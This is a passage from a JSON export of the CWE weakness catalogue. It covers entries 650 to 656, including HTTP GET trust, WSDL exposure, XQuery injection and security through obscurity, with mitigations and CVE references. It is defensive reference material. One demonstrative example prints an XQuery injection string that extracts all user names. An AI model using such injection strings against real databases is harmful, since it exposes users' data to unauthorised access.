          "Description": "An IPSec configuration does not perform integrity checking of the IPSec packet as the result of either not configuring ESP properly to support the integrity service or using AH improperly. In either case, the security gateway receiving the IPSec packet would not validate the integrity of the packet to ensure that it was not changed. Thus if the packets were intercepted the attacker could undetectably change some of the bits in the packets. The meaningful bit flipping was possible due to the known weaknesses in the CBC encryption mode. Since the attacker knew the structure of the packet, they were able (in one variation of the attack) to use bit flipping to change the destination IP of the packet to the destination machine controlled by the attacker. And so the destination security gateway would decrypt the packet and then forward the plaintext to the machine controlled by the attacker. The attacker could then read the original message. For instance if VPN was used with the vulnerable IPSec configuration the attacker could read the victim's e-mail. This vulnerability demonstrates the need to enforce the integrity service properly when critical data could be modified by an attacker. This problem might have also been mitigated by using an encryption mode that is not susceptible to bit flipping attacks, but the preferred mechanism to address this problem still remains message verification for integrity. While this attack focuses on the network layer and requires an entity that controls part of the communication path such as a router, the situation is not much different at the software level, where an attacker can modify tokens/parameters used by the application.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2005-0039"
        }
      ],
      "RelatedAttackPatterns": [
        "463"
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "650",
      "Name": "Trusting HTTP Permission Methods on the Server Side",
      "Abstraction": "Variant",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The server contains a protection mechanism that assumes that any URI that is accessed using HTTP GET will not cause a state change to the associated resource. This might allow attackers to bypass intended access restrictions and conduct resource modification and deletion attacks, since some applications allow GET to modify state.",
      "ExtendedDescription": "The HTTP GET method and some other methods are designed to retrieve resources and not to alter the state of the application or resources on the server side. Furthermore, the HTTP specification requires that GET requests (and other requests) should not have side effects. Believing that it will be enough to prevent unintended resource alterations, an application may disallow the HTTP requests to perform DELETE, PUT and POST operations on the resource representation. However, there is nothing in the HTTP protocol itself that actually prevents the HTTP GET method from performing more than just query of the data. Developers can easily code programs that accept a HTTP GET request that do in fact create, update or delete data on the server. For instance, it is a common practice with REST based Web Services to have HTTP GET requests modifying resources on the server side. However, whenever that happens, the access control needs to be properly enforced in the application. No assumptions should be made that only HTTP DELETE, PUT, POST, and other methods have the power to alter the representation of the resource being accessed in the request.",
      "LikelihoodOfExploit": "High",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "436",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Class": "Not Language-Specific",
          "Prevalence": "Undetermined"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Architecture and Design"
        },
        {
          "Phase": "Implementation"
        },
        {
          "Phase": "Operation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Access Control"
          ],
          "Impact": [
            "Gain Privileges or Assume Identity"
          ],
          "Note": "An attacker could escalate privileges."
        },
        {
          "Scope": [
            "Integrity"
          ],
          "Impact": [
            "Modify Application Data"
          ],
          "Note": "An attacker could modify resources."
        },
        {
          "Scope": [
            "Confidentiality"
          ],
          "Impact": [
            "Read Application Data"
          ],
          "Note": "An attacker could obtain sensitive information."
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "System Configuration"
          ],
          "Description": "Configure ACLs on the server side to ensure that proper level of access control is defined for each accessible resource representation."
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "651",
      "Name": "Exposure of WSDL File Containing Sensitive Information",
      "Abstraction": "Variant",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The Web services architecture may require exposing a Web Service Definition Language (WSDL) file that contains information on the publicly accessible services and how callers of these services should interact with them (e.g. what parameters they expect and what types they return).",
      "ExtendedDescription": "\n\nAn information exposure may occur if any of the following apply:\n\n\n  - The WSDL file is accessible to a wider audience than intended.\n\n  - The WSDL file contains information on the methods/services that should not be publicly accessible or information about deprecated methods. This problem is made more likely due to the WSDL often being automatically generated from the code.\n\n  - Information in the WSDL file helps guess names/locations of methods/resources that should not be publicly accessible.\n\n",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "538",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Class": "Not Language-Specific",
          "Prevalence": "Undetermined"
        },
        {
          "Type": "Technology",
          "Name": "Web Server",
          "Prevalence": "Often"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation"
        },
        {
          "Phase": "Operation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Confidentiality"
          ],
          "Impact": [
            "Read Application Data"
          ],
          "Note": "The attacker may find sensitive information located in the WSDL file."
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Architecture and Design"
          ],
          "Description": "Limit access to the WSDL file as much as possible. If services are provided only to a limited number of entities, it may be better to provide WSDL privately to each of these entities than to publish WSDL publicly."
        },
        {
          "Phase": [
            "Architecture and Design"
          ],
          "Strategy": "Separation of Privilege",
          "Description": "Make sure that WSDL does not describe methods that should not be publicly accessible. Make sure to protect service methods that should not be publicly accessible with access controls."
        },
        {
          "Phase": [
            "Architecture and Design"
          ],
          "Description": "Do not use method names in WSDL that might help an adversary guess names of private methods/resources used by the service."
        }
      ],
      "DemonstrativeExamples": [
        {
          "Entries": [
            {
              "IntroText": "The WSDL for a service providing information on the best price of a certain item exposes the following method: float getBestPrice(String ItemID) An attacker might guess that there is a method setBestPrice (String ItemID, float Price) that is available and invoke that method to try and change the best price of a given item to their advantage. The attack may succeed if the attacker correctly guesses the name of the method, the method does not have proper access controls around it and the service itself has the functionality to update the best price of the item."
            }
          ]
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "652",
      "Name": "Improper Neutralization of Data within XQuery Expressions ('XQuery Injection')",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The product uses external input to dynamically construct an XQuery expression used to retrieve data from an XML database, but it does not neutralize or incorrectly neutralizes that input. This allows an attacker to control the structure of the query.",
      "ExtendedDescription": "The net effect is that the attacker will have control over the information selected from the XML database and may use that ability to control application flow, modify logic, retrieve unauthorized data, or bypass important checks (e.g. authentication).",
      "LikelihoodOfExploit": "High",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "943",
          "ViewID": "1000",
          "Ordinal": "Primary"
        },
        {
          "Nature": "ChildOf",
          "CweID": "91",
          "ViewID": "1000"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Class": "Not Language-Specific",
          "Prevalence": "Undetermined"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation",
          "Note": "REALIZATION: This weakness is caused during implementation of an architectural security tactic."
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Confidentiality"
          ],
          "Impact": [
            "Read Application Data"
          ],
          "Note": "An attacker might be able to read sensitive information from the XML database."
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Implementation"
          ],
          "Description": "Use parameterized queries. This will help ensure separation between data plane and control plane."
        },
        {
          "Phase": [
            "Implementation"
          ],
          "Description": "Properly validate user input. Reject data where appropriate, filter where appropriate and escape where appropriate. Make sure input that will be used in XQL queries is safe in that context."
        }
      ],
      "DemonstrativeExamples": [
        {
          "Entries": [
            {
              "IntroText": "An attacker may pass XQuery expressions embedded in an otherwise standard XML document. The attacker tunnels through the application entry point to target the resource access layer. The string below is an example of an attacker accessing the accounts.xml to request the service provider send all user names back. doc(accounts.xml)//user[name='*'] The attacks that are possible through XQuery are difficult to predict, if the data is not validated prior to executing the XQL."
            }
          ]
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "WASC",
          "EntryID": "46",
          "EntryName": "XQuery Injection"
        },
        {
          "TaxonomyName": "Software Fault Patterns",
          "EntryID": "SFP24",
          "EntryName": "Tainted input to command"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      },
      "Notes": [
        {
          "Type": "Relationship",
          "Note": "This weakness is similar to other weaknesses that enable injection style attacks, such as SQL injection, command injection and LDAP injection. The main difference is that the target of attack here is the XML database."
        }
      ]
    },
    {
      "ID": "653",
      "Name": "Improper Isolation or Compartmentalization",
      "Abstraction": "Class",
      "Structure": "Simple",
      "Status": "Draft",
      "Description": "The product does not properly compartmentalize or isolate functionality, processes, or resources that require different privilege levels, rights, or permissions.",
      "ExtendedDescription": "When a weakness occurs in functionality that is accessible by lower-privileged users, then without strong boundaries, an attack might extend the scope of the damage to higher-privileged users.",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "657",
          "ViewID": "1000",
          "Ordinal": "Primary"
        },
        {
          "Nature": "ChildOf",
          "CweID": "693",
          "ViewID": "1000"
        }
      ],
      "WeaknessOrdinalities": [
        {
          "Ordinality": "Primary"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Class": "Not Language-Specific",
          "Prevalence": "Undetermined"
        }
      ],
      "AlternateTerms": [
        {
          "Term": "Separation of Privilege",
          "Description": "Some people and publications use the term \"Separation of Privilege\" to describe this weakness, but this term has dual meanings in current usage. This node conflicts with the original definition of \"Separation of Privilege\" by Saltzer and Schroeder; that original definition is more closely associated with CWE-654. Because there are multiple interpretations, use of the \"Separation of Privilege\" term is discouraged."
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Architecture and Design",
          "Note": "COMMISSION: This weakness refers to an incorrect design related to an architectural security tactic."
        },
        {
          "Phase": "Implementation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Access Control"
          ],
          "Impact": [
            "Gain Privileges or Assume Identity",
            "Bypass Protection Mechanism"
          ],
          "Note": "The exploitation of a weakness in low-privileged areas of the software can be leveraged to reach higher-privileged areas without having to overcome any additional obstacles."
        }
      ],
      "DetectionMethods": [
        {
          "Method": "Automated Static Analysis - Binary or Bytecode",
          "Description": "\n\nAccording to SOAR, the following detection techniques may be useful:\n\n```\n\t\tCost effective for partial coverage:\n```\n\n\t\tCompare binary / bytecode to application permission manifest",
          "Effectiveness": "SOAR Partial"
        },
        {
          "Method": "Manual Static Analysis - Source Code",
          "Description": "\n\nAccording to SOAR, the following detection techniques may be useful:\n\n```\n\t\tHighly cost effective:\n```\n\n\t\tManual Source Code Review (not inspections)\n\t```\n\t\tCost effective for partial coverage:\n```\n\n\t\tFocused Manual Spotcheck - Focused manual analysis of source",
          "Effectiveness": "High"
        },
        {
          "Method": "Architecture or Design Review",
          "Description": "\n\nAccording to SOAR, the following detection techniques may be useful:\n\n```\n\t\tHighly cost effective:\n```\n\n\t\tInspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.)\n\t\tFormal Methods / Correct-By-Construction\n\t```\n\t\tCost effective for partial coverage:\n```\n\n\t\tAttack Modeling",
          "Effectiveness": "High"
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Architecture and Design"
          ],
          "Description": "Break up privileges between different modules, objects, or entities. Minimize the interfaces between modules and require strong access control between them."
        }
      ],
      "DemonstrativeExamples": [
        {
          "ID": "DX-167",
          "Entries": [
            {
              "IntroText": "Single sign-on technology is intended to make it easier for users to access multiple resources or domains without having to authenticate each time. While this is highly convenient for the user and attempts to address problems with psychological acceptability, it also means that a compromise of a user's credentials can provide immediate access to all other resources or domains."
            }
          ]
        },
        {
          "Entries": [
            {
              "IntroText": "The traditional UNIX privilege model provides root with arbitrary access to all resources, but root is frequently the only user that has privileges. As a result, administrative tasks require root privileges, even if those tasks are limited to a small area, such as updating user manpages. Some UNIX flavors have a \"bin\" user that is the owner of system executables, but since root relies on executables owned by bin, a compromise of the bin account can be leveraged for root privileges by modifying a bin-owned executable, such as CVE-2007-4238."
            }
          ]
        }
      ],
      "ObservedExamples": [
        {
          "Reference": "CVE-2021-33096",
          "Description": "Improper isolation of shared resource in a network-on-chip leads to denial of service",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2021-33096"
        },
        {
          "Reference": "CVE-2019-6260",
          "Description": "Baseboard Management Controller (BMC) device implements Advanced High-performance Bus (AHB) bridges that do not require authentication for arbitrary read and write access to the BMC's physical address space from the host, and possibly the network [REF-1138].",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2019-6260"
        }
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-196",
          "Authors": [
            "Jerome H. Saltzer",
            "Michael D. Schroeder"
          ],
          "Title": "The Protection of Information in Computer Systems",
          "Publication": "Proceedings of the IEEE 63",
          "PublicationYear": "1975",
          "PublicationMonth": "09",
          "URL": "http://web.mit.edu/Saltzer/www/publications/protection/"
        },
        {
          "ExternalReferenceID": "REF-535",
          "Authors": [
            "Sean Barnum",
            "Michael Gegick"
          ],
          "Title": "Separation of Privilege",
          "PublicationYear": "2005",
          "PublicationMonth": "12",
          "PublicationDay": "06",
          "URL": "https://web.archive.org/web/20220126060047/https://www.cisa.gov/uscert/bsi/articles/knowledge/principles/separation-of-privilege",
          "URLDate": "2023-04-07"
        },
        {
          "ExternalReferenceID": "REF-1138",
          "Authors": [
            "Stewart Smith"
          ],
          "Title": "CVE-2019-6260: Gaining control of BMC from the host processor",
          "PublicationYear": "2019",
          "URL": "https://www.flamingspork.com/blog/2019/01/23/cve-2019-6260:-gaining-control-of-bmc-from-the-host-processor/"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      },
      "Notes": [
        {
          "Type": "Relationship",
          "Note": "There is a close association with CWE-250 (Execution with Unnecessary Privileges). CWE-653 is about providing separate components for each \"privilege\"; CWE-250 is about ensuring that each component has the least amount of privileges possible. In this fashion, compartmentalization becomes one mechanism for reducing privileges."
        },
        {
          "Type": "Terminology",
          "Note": "The term \"Separation of Privilege\" is used in several different ways in the industry, but they generally combine two closely related principles: compartmentalization (this node) and using only one factor in a security decision (CWE-654). Proper compartmentalization implicitly introduces multiple factors into a security decision, but there can be cases in which multiple factors are required for authentication or other mechanisms that do not involve compartmentalization, such as performing all required checks on a submitted certificate. It is likely that CWE-653 and CWE-654 will provoke further discussion."
        }
      ]
    },
    {
      "ID": "654",
      "Name": "Reliance on a Single Factor in a Security Decision",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Draft",
      "Description": "A protection mechanism relies exclusively, or to a large extent, on the evaluation of a single condition or the integrity of a single object or entity in order to make a decision about granting access to restricted resources or functionality.",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "657",
          "ViewID": "1000",
          "Ordinal": "Primary"
        },
        {
          "Nature": "ChildOf",
          "CweID": "693",
          "ViewID": "1000"
        }
      ],
      "WeaknessOrdinalities": [
        {
          "Ordinality": "Primary"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Class": "Not Language-Specific",
          "Prevalence": "Undetermined"
        }
      ],
      "AlternateTerms": [
        {
          "Term": "Separation of Privilege",
          "Description": "Some people and publications use the term \"Separation of Privilege\" to describe this weakness, but this term has dual meanings in current usage. While this entry is closely associated with the original definition of \"Separation of Privilege\" by Saltzer and Schroeder, others use the same term to describe poor compartmentalization (CWE-653). Because there are multiple interpretations, use of the \"Separation of Privilege\" term is discouraged."
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Architecture and Design"
        },
        {
          "Phase": "Implementation"
        },
        {
          "Phase": "Operation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Access Control"
          ],
          "Impact": [
            "Gain Privileges or Assume Identity"
          ],
          "Note": "If the single factor is compromised (e.g. by theft or spoofing), then the integrity of the entire security mechanism can be violated with respect to the user that is identified by that factor."
        },
        {
          "Scope": [
            "Non-Repudiation"
          ],
          "Impact": [
            "Hide Activities"
          ],
          "Note": "It can become difficult or impossible for the product to be able to distinguish between legitimate activities by the entity who provided the factor, versus illegitimate activities by an attacker."
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Architecture and Design"
          ],
          "Description": "Use multiple simultaneous checks before granting access to critical operations or granting critical privileges. A weaker but helpful mitigation is to use several successive checks (multiple layers of security)."
        },
        {
          "Phase": [
            "Architecture and Design"
          ],
          "Description": "Use redundant access rules on different choke points (e.g., firewalls)."
        }
      ],
      "DemonstrativeExamples": [
        {
          "Entries": [
            {
              "IntroText": "Password-only authentication is perhaps the most well-known example of use of a single factor. Anybody who knows a user's password can impersonate that user."
            }
          ]
        },
        {
          "Entries": [
            {
              "IntroText": "When authenticating, use multiple factors, such as \"something you know\" (such as a password) and \"something you have\" (such as a hardware-based one-time password generator, or a biometric device)."
            }
          ]
        }
      ],
      "ObservedExamples": [
        {
          "Reference": "CVE-2022-35248",
          "Description": "Chat application skips validation when Central Authentication Service (CAS) is enabled, effectively removing the second factor from two-factor authentication",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2022-35248"
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "ISA/IEC 62443",
          "EntryID": "Part 4-1",
          "EntryName": "Req SD-3"
        },
        {
          "TaxonomyName": "ISA/IEC 62443",
          "EntryID": "Part 4-1",
          "EntryName": "Req SD-4"
        },
        {
          "TaxonomyName": "ISA/IEC 62443",
          "EntryID": "Part 4-1",
          "EntryName": "Req SI-1"
        }
      ],
      "RelatedAttackPatterns": [
        "16",
        "274",
        "49",
        "55",
        "560",
        "565",
        "600",
        "652",
        "653",
        "70"
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-196",
          "Authors": [
            "Jerome H. Saltzer",
            "Michael D. Schroeder"
          ],
          "Title": "The Protection of Information in Computer Systems",
          "Publication": "Proceedings of the IEEE 63",
          "PublicationYear": "1975",
          "PublicationMonth": "09",
          "URL": "http://web.mit.edu/Saltzer/www/publications/protection/"
        },
        {
          "ExternalReferenceID": "REF-535",
          "Authors": [
            "Sean Barnum",
            "Michael Gegick"
          ],
          "Title": "Separation of Privilege",
          "PublicationYear": "2005",
          "PublicationMonth": "12",
          "PublicationDay": "06",
          "URL": "https://web.archive.org/web/20220126060047/https://www.cisa.gov/uscert/bsi/articles/knowledge/principles/separation-of-privilege",
          "URLDate": "2023-04-07"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      },
      "Notes": [
        {
          "Type": "Maintenance",
          "Note": "This entry is closely associated with the term \"Separation of Privilege.\" This term is used in several different ways in the industry, but they generally combine two closely related principles: compartmentalization (CWE-653) and using only one factor in a security decision (this entry). Proper compartmentalization implicitly introduces multiple factors into a security decision, but there can be cases in which multiple factors are required for authentication or other mechanisms that do not involve compartmentalization, such as performing all required checks on a submitted certificate. It is likely that CWE-653 and CWE-654 will provoke further discussion."
        }
      ]
    },
    {
      "ID": "655",
      "Name": "Insufficient Psychological Acceptability",
      "Abstraction": "Class",
      "Structure": "Simple",
      "Status": "Draft",
      "Description": "The product has a protection mechanism that is too difficult or inconvenient to use, encouraging non-malicious users to disable or bypass the mechanism, whether by accident or on purpose.",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "657",
          "ViewID": "1000",
          "Ordinal": "Primary"
        },
        {
          "Nature": "ChildOf",
          "CweID": "693",
          "ViewID": "1000"
        }
      ],
      "WeaknessOrdinalities": [
        {
          "Ordinality": "Primary"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Class": "Not Language-Specific",
          "Prevalence": "Undetermined"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Architecture and Design"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Access Control"
          ],
          "Impact": [
            "Bypass Protection Mechanism"
          ],
          "Note": "By bypassing the security mechanism, a user might leave the system in a less secure state than intended by the administrator, making it more susceptible to compromise."
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Testing"
          ],
          "Description": "Where possible, perform human factors and usability studies to identify where your product's security mechanisms are difficult to use, and why."
        },
        {
          "Phase": [
            "Architecture and Design"
          ],
          "Description": "Make the security mechanism as seamless as possible, while also providing the user with sufficient details when a security decision produces unexpected results."
        }
      ],
      "DemonstrativeExamples": [
        {
          "Entries": [
            {
              "IntroText": "In \"Usability of Security: A Case Study\" [REF-540], the authors consider human factors in a cryptography product. Some of the weakness relevant discoveries of this case study were: users accidentally leaked sensitive information, could not figure out how to perform some tasks, thought they were enabling a security option when they were not, and made improper trust decisions."
            }
          ]
        },
        {
          "Entries": [
            {
              "IntroText": "Enforcing complex and difficult-to-remember passwords that need to be frequently changed for access to trivial resources, e.g., to use a black-and-white printer. Complex password requirements can also cause users to store the passwords in an unsafe manner so they don't have to remember them, such as using a sticky note or saving them in an unencrypted file."
            }
          ]
        },
        {
          "Entries": [
            {
              "IntroText": "Some CAPTCHA utilities produce images that are too difficult for a human to read, causing user frustration."
            }
          ]
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "ISA/IEC 62443",
          "EntryID": "Part 2-1",
          "EntryName": "Req 4.3.3.6"
        },
        {
          "TaxonomyName": "ISA/IEC 62443",
          "EntryID": "Part 4-1",
          "EntryName": "Req SD-4"
        }
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-196",
          "Authors": [
            "Jerome H. Saltzer",
            "Michael D. Schroeder"
          ],
          "Title": "The Protection of Information in Computer Systems",
          "Publication": "Proceedings of the IEEE 63",
          "PublicationYear": "1975",
          "PublicationMonth": "09",
          "URL": "http://web.mit.edu/Saltzer/www/publications/protection/"
        },
        {
          "ExternalReferenceID": "REF-539",
          "Authors": [
            "Sean Barnum",
            "Michael Gegick"
          ],
          "Title": "Psychological Acceptability",
          "PublicationYear": "2005",
          "PublicationMonth": "09",
          "PublicationDay": "15",
          "URL": "https://web.archive.org/web/20221104163022/https://www.cisa.gov/uscert/bsi/articles/knowledge/principles/psychological-acceptability",
          "URLDate": "2023-04-07"
        },
        {
          "ExternalReferenceID": "REF-540",
          "Authors": [
            "J. D. Tygar",
            "Alma Whitten"
          ],
          "Title": "Usability of Security: A Case Study",
          "Publication": "SCS Technical Report Collection, CMU-CS-98-155",
          "PublicationYear": "1998",
          "PublicationMonth": "12",
          "PublicationDay": "15",
          "URL": "http://reports-archive.adm.cs.cmu.edu/anon/1998/CMU-CS-98-155.pdf"
        },
        {
          "ExternalReferenceID": "REF-44",
          "Section": "\"Sin 14: Poor Usability.\" Page 217",
          "Authors": [
            "Michael Howard",
            "David LeBlanc",
            "John Viega"
          ],
          "Title": "24 Deadly Sins of Software Security",
          "Publication": "McGraw-Hill",
          "PublicationYear": "2010"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed-with-Review",
        "Rationale": "This CWE entry is a Class and might have Base-level children that would be more appropriate",
        "Comments": "Examine children of this entry to see if there is a better fit",
        "Reasons": [
          "Abstraction"
        ]
      },
      "Notes": [
        {
          "Type": "Other",
          "Note": "This weakness covers many security measures causing user inconvenience, requiring effort or causing frustration, that are disproportionate to the risks or value of the protected assets, or that are perceived to be ineffective."
        },
        {
          "Type": "Maintenance",
          "Note": "The Taxonomy_Mappings to ISA/IEC 62443 were added in CWE 4.10, but they are still under review and might change in future CWE versions. These draft mappings were performed by members of the \"Mapping CWE to 62443\" subgroup of the CWE-CAPEC ICS/OT Special Interest Group (SIG), and their work is incomplete as of CWE 4.10. The mappings are included to facilitate discussion and review by the broader ICS/OT community, and they are likely to change in future CWE versions."
        }
      ]
    },
    {
      "ID": "656",
      "Name": "Reliance on Security Through Obscurity",
      "Abstraction": "Class",
      "Structure": "Simple",
      "Status": "Draft",
      "Description": "The product uses a protection mechanism whose strength depends heavily on its obscurity, such that knowledge of its algorithms or key data is sufficient to defeat the mechanism.",
      "ExtendedDescription": "This reliance on \"security through obscurity\" can produce resultant weaknesses if an attacker is able to reverse engineer the inner workings of the mechanism. Note that obscurity can be one small part of defense in depth, since it can create more work for an attacker; however, it is a significant risk if used as the primary means of protection.",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "657",
          "ViewID": "1000",
          "Ordinal": "Primary"
        },
        {
          "Nature": "ChildOf",
          "CweID": "693",
          "ViewID": "1000"
        },
        {
          "Nature": "CanPrecede",
          "CweID": "259",
          "ViewID": "1000"
        },
        {
          "Nature": "CanPrecede",
          "CweID": "321",
          "ViewID": "1000"
        },
        {
          "Nature": "CanPrecede",
          "CweID": "472",
          "ViewID": "1000"
        }
      ],
      "WeaknessOrdinalities": [
        {
          "Ordinality": "Primary"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Class": "Not Language-Specific",
          "Prevalence": "Undetermined"
        }
      ],
      "AlternateTerms": [
        {
          "Term": "Never Assuming your secrets are safe"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Architecture and Design"
        },
        {
          "Phase": "Implementation",
          "Note": "REALIZATION: This weakness is caused during implementation of an architectural security tactic."
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Confidentiality",
            "Integrity",
            "Availability",
            "Other"
          ],
          "Impact": [
            "Other"
          ],
          "Note": "The security mechanism can be bypassed easily."
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Architecture and Design"
          ],
          "Description": "Always consider whether knowledge of your code or design is sufficient to break it. Reverse engineering is a highly successful discipline, and financially feasible for motivated adversaries. Black-box techniques are established for binary analysis of executables that use obfuscation, runtime analysis of proprietary protocols, inferring file formats, and others."
        },
        {
          "Phase": [
            "Architecture and Design"
          ],
          "Description": "When available, use publicly-vetted algorithms and procedures, as these are more likely to undergo more extensive security analysis and testing. This is especially the case with encryption and authentication."
        }
      ],
      "DemonstrativeExamples": [
        {
          "ID": "DX-168",
          "Entries": [
            {
              "IntroText": "The design of TCP relies on the secrecy of Initial Sequence Numbers (ISNs), as originally covered in CVE-1999-0077 [REF-542]. If ISNs can be guessed (due to predictability, CWE-330) or sniffed (due to lack of encryption during transmission, CWE-312), then an attacker can hijack or spoof connections. Many TCP implementations have had variations of this problem over the years, including CVE-2004-0641, CVE-2002-1463, CVE-2001-0751, CVE-2001-0328, CVE-2001-0288, CVE-2001-0163, CVE-2001-0162, CVE-2000-0916, and CVE-2000-0328."
            },
            {
              "Reference": "REF-542"
            }
          ]
        }
      ],
      "ObservedExamples": [
        {
          "Reference": "CVE-2006-6588",
          "Description": "Reliance on hidden form fields in a web application. Many web application vulnerabilities exist because the developer did not consider that \"hidden\" form fields can be processed using a modified client.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2006-6588"
        },
        {
          "Reference": "CVE-2006-7142",
          "Description": "Hard-coded cryptographic key stored in executable program.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2006-7142"
        },
        {
          "Reference": "CVE-2005-4002",
          "Description": "Hard-coded cryptographic key stored in executable program.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2005-4002"
        },
        {
          "Reference": "CVE-2006-4068",
          "Description": "Hard-coded hashed values for username and password contained in client-side script, allowing brute-force offline attacks.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2006-4068"
        }
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-196",
          "Authors": [
            "Jerome H. Saltzer",
            "Michael D. Schroeder"
          ],
          "Title": "The Protection of Information in Computer Systems",
          "Publication": "Proceedings of the IEEE 63",
          "PublicationYear": "1975",
          "PublicationMonth": "09",
          "URL": "http://web.mit.edu/Saltzer/www/publications/protection/"
        },
        {
          "ExternalReferenceID": "REF-544",
          "Authors": [
            "Sean Barnum",
            "Michael Gegick"
          ],
          "Title": "Never Assuming that Your Secrets Are Safe",
          "PublicationYear": "2005",
          "PublicationMonth": "09",
          "PublicationDay": "14",
          "URL": "https://web.archive.org/web/20220126060054/https://www.cisa.gov/uscert/bsi/articles/knowledge/principles/never-assuming-that-your-secrets-are-safe",
          "URLDate": "2023-04-07"
        },
        {
          "ExternalReferenceID": "REF-542",
          "Authors": [
            "Jon Postel, Editor"
          ],
          "Title": "RFC: 793, TRANSMISSION CONTROL PROTOCOL",
          "PublicationYear": "1981",
          "PublicationMonth": "09",
